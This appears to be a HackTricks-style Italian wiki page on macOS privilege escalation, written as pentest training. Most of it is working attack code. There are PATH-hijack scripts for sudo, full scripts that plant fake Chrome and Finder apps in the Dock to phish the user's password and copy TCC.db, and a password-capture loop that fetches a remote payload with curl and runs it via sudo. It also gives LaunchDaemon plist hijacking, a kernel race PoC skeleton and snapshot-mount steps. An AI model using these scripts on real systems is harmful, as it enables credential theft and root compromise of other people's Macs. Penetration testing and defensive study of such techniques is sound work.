# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se sei arrivato qui cercando TCC privilege escalation vai a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Tieni presente che **la maggior parte dei trucchi sulla privilege escalation che interessano Linux/Unix influenzano anche le macchine MacOS**. Quindi vedi:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

Puoi trovare l'originale [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Tuttavia, macOS **mantiene** il **`PATH`** dell'utente quando esegue **`sudo`**. Ciò significa che un altro modo per ottenere questo attacco sarebbe quello di **hijack other binaries** che la vittima eseguirà quando **esegue sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Nota che un utente che usa il terminale molto probabilmente avrà **Homebrew installed**. Quindi è possibile dirottare binari in **`/opt/homebrew/bin`**.

### Impersonazione del Dock

Usando un po' di **social engineering** potresti **impersonare, per esempio, Google Chrome** all'interno del Dock ed eseguire effettivamente il tuo script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Alcuni suggerimenti:

- Controlla nel Dock se è presente Chrome e, in tal caso, **rimuovi** quell'elemento e **aggiungi** la **falsa** **voce di Chrome nella stessa posizione** nell'array del Dock.

<details>
<summary>Script di impersonazione di Chrome nel Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Alcuni suggerimenti:

- Non puoi **rimuovere Finder dal Dock**, quindi se vuoi aggiungerlo al Dock, potresti mettere il Finder falso proprio accanto a quello reale. Per questo devi **aggiungere la voce del Finder finto all'inizio dell'array del Dock**.
- Un'altra opzione è non metterlo nel Dock e semplicemente aprirlo; "Finder che chiede di controllare Finder" non è così strano.
- Un'altra opzione per **escalare a root senza chiedere** la password con una finestra orribile, è far sì che Finder chieda veramente la password per eseguire un'azione privilegiata:
- Chiedi a Finder di copiare in **`/etc/pam.d`** un nuovo file **`sudo`** (La richiesta della password indicherà che "Finder vuole copiare sudo")
- Chiedi a Finder di copiare un nuovo **Authorization Plugin** (Puoi controllare il nome del file così la richiesta della password indicherà che "Finder vuole copiare Finder.bundle")

<details>
<summary>Script di impersonazione del Dock di Finder</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware frequentemente abusa dell'interazione con l'utente per **catturare una password valida per sudo** e riutilizzarla programmaticamente. Un flusso comune:

1. Identificare l'utente connesso con `whoami`.
2. Ripetere le richieste di password finché `dscl . -authonly "$user" "$pw"` non restituisce successo.
3. Memorizzare la credenziale in cache (es., `/tmp/.pass`) e avviare azioni privilegiate con `sudo -S` (password via stdin).

Esempio di catena minima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La password rubata può quindi essere riutilizzata per **clear Gatekeeper quarantine with `xattr -c`**, copiare LaunchDaemons o altri file privilegiati, ed eseguire ulteriori stages in modo non interattivo.

## Vettori specifici per macOS più recenti (2023–2025)

### `AuthorizationExecuteWithPrivileges` deprecato ancora utilizzabile

`AuthorizationExecuteWithPrivileges` è stato deprecato in 10.7 ma **funziona ancora su Sonoma/Sequoia**. Molti updater commerciali richiamano `/usr/libexec/security_authtrampoline` con un percorso non attendibile. Se il binario di destinazione è scrivibile dall'utente, puoi piantare un trojan e sfruttare il prompt legittimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combina con le **masquerading tricks above** per presentare una finestra di dialogo password credibile.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Se un LaunchDaemon plist o il suo target `ProgramArguments` è **scrivibile dall'utente**, puoi elevare i privilegi sostituendolo e poi forzando launchd a ricaricarlo:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Questo rispecchia il pattern di exploit pubblicato per **CVE-2025-24085**, dove un plist scrivibile è stato abusato per eseguire codice dell'attaccante come root.

### XNU SMR credential race (CVE-2025-24118)

Una **race in `kauth_cred_proc_update`** permette a un attaccante locale di corrompere il puntatore delle credenziali in sola lettura (`proc_ro.p_ucred`) gareggiando con loop `setgid()`/`getgid()` tra thread fino a che non si verifica un `memcpy` non atomico. La corruzione riuscita fornisce **uid 0** e accesso alla memoria del kernel. Struttura minima del PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Affiancare heap grooming per posizionare dati controllati dove il puntatore viene riletto. Sulle build vulnerabili questo è un affidabile **local kernel privesc** senza necessità di bypassare SIP.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Se si dispone già di root, SIP continua a bloccare le scritture nelle posizioni di sistema. Il bug **Migraine** sfrutta l'entitlement di Migration Assistant `com.apple.rootless.install.heritable` per spawnare un processo figlio che eredita il bypass SIP e sovrascrive percorsi protetti (es., `/System/Library/LaunchDaemons`). La catena:

1. Ottenere root su un sistema live.
2. Avviare `systemmigrationd` con uno stato appositamente creato per eseguire un binario controllato dall'attaccante.
3. Usare l'entitlement ereditato per patchare i file protetti da SIP, persistendo anche dopo il riavvio.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Diversi daemon Apple accettano **NSPredicate** oggetti tramite XPC e validano solo il campo `expressionType`, che è controllabile dall'attaccante. Creando un predicate che valuta selectors arbitrari puoi ottenere **code execution in root/system XPC services** (es., `coreduetd`, `contextstored`). Se combinato con un'app sandbox escape iniziale, questo concede **privilege escalation without user prompts**. Cerca endpoint XPC che deserializzano predicate e che non implementano un visitor robusto.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualsiasi utente** (anche non privilegiato) può creare e montare uno snapshot di Time Machine e **accedere A TUTTI i file** di quello snapshot.\
L'**unico privilegio** necessario è che l'applicazione usata (come `Terminal`) abbia **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) che deve essere concesso da un admin.

<details>
<summary>Montare uno snapshot di Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Una spiegazione più dettagliata può essere [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Informazioni sensibili

Questo può essere utile per escalate privileges:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Riferimenti

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
